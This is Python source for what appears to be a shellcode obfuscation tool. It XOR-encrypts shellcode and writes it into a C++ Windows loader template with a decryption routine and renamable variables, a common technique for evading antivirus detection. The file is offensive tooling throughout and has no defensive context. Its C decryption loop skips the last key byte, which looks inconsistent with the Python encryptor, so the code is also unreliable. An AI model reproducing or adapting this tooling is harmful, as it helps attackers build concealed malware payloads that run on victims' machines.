def xor(shellcode, xor_key):

    blob = ""

    for i in range(len(shellcode)):
        current = shellcode[i]
        current_key = xor_key[i % len(xor_key)]
        o = lambda x: x if isinstance(x, int) else ord(x)
        blob += chr(o(current) ^ ord(current_key))

    output = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in blob) + ' };'
    print("[+] Generated encrypted shellcode with XOR key: %s" % xor_key)
    return output


def generate_xor_template(function_name, xor_shellcode, xor_key, shellcode_var, shellcode_len_var, key_var):

    payload_stub = """
#include <windows.h>
#include <iostream>
#include <psapi.h>

#define FILE_OPEN 0x00000001
#define FILE_NON_DIRECTORY_FILE 0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020

typedef VOID(NTAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

unsigned char REPLACE_W_VAR1[] = REPLACE_WITH_SHELLCODE
SIZE_T REPLACE_W_VAR2 = sizeof(REPLACE_W_VAR1);
char REPLACE_W_VAR3[] = "REPLACE_WITH_XOR_KEY";

void REPLACE_WITH_XOR_FUNCTION_NAME(char* data, size_t data_len, char* key, size_t key_len) {

	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

"""

    payload_stub = payload_stub.replace("REPLACE_WITH_XOR_FUNCTION_NAME", function_name)
    payload_stub = payload_stub.replace("REPLACE_WITH_SHELLCODE", xor_shellcode)
    payload_stub = payload_stub.replace("REPLACE_WITH_XOR_KEY", xor_key)
    payload_stub = payload_stub.replace("REPLACE_W_VAR1", shellcode_var)
    payload_stub = payload_stub.replace("REPLACE_W_VAR2", shellcode_len_var)
    payload_stub = payload_stub.replace("REPLACE_W_VAR3", key_var)

    return payload_stub


